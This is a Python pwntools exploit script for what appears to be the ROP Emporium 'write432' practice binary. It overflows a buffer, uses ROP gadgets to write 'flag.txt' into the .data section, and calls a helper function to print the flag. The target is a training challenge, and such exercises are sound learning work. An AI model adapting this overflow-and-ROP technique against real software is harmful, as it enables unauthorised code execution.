import sys
from pwn import *

context.arch = "i386"

# .data section (0x8)
addr_data_0 = p32(0x0804a018)
addr_data_1 = p32(0x0804a01c)
# 0x080485aa: pop edi; pop ebp; ret;
pop_0 = p32(0x080485aa)
# 0x0804839d: pop ebx; ret;
pop_1 = p32(0x0804839d)
# 0x08048543: mov dword ptr [edi], ebp; ret;
mov_0 = p32(0x08048543)
# payload data
data_0 = b'flag'
data_1 = b'.txt'
# usefulFunction
func_userfulFunction = p32(0x08048538)

payload = b'a'*44

payload += pop_0
payload += addr_data_0 + data_0

payload += mov_0

payload += pop_0
payload += addr_data_1 + data_1

payload += mov_0

payload += func_userfulFunction
payload += addr_data_0

print(payload)
with open("payload.txt", "wb+") as f:
    f.write(payload)

if len(sys.argv) == 2:
    if str(sys.argv[1]) == "-g":
        log.warn("Entering debug mode")
        prog = gdb.debug("./write432", '''
            unset env
            break *0x080485aa
        ''')
    else:
        log.critical("Please use '-g' if you would like to debug")
        exit(-1)
else:
    prog = process("./write432")

output = prog.recvuntil(b">")
print(output.decode("utf-8"))

prog.sendline(payload)

output = prog.recvuntil(b"}")
print(output.decode("utf-8"))

prog.clean()
